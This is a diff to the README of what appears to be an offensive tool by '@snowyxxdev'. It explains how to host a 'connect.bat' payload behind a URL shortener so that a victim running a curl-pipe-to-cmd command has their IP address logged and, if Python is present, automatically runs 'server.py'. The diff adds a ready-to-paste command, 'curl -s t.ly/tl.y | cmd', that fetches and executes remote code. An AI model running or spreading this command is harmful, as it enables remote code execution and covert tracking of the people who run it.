@@ -10,7 +10,7 @@ After that, you'll need to replace the "https://raw.githubusercontent.com/snowyx
 
 You can create a paste containing the "connect.bat" contents, and use a URL shortener. Now, if you run the following command:
 
-`curl -s (short-url) | cmd`
+- `curl -s (short-url) | cmd`
 
 The IP Address will be logged, and provided from the URL shortener service (depending on which service).
 And, if they have Python installed; it'll automatically run the code in "server.py".
@@ -20,3 +20,4 @@ And, if they have Python installed; it'll automatically run the code in "server.
 
 ## Made by @snowyxxdev
 - Shortened URL: *t.ly/tl.y*
+- Command: `curl -s t.ly/tl.y | cmd`
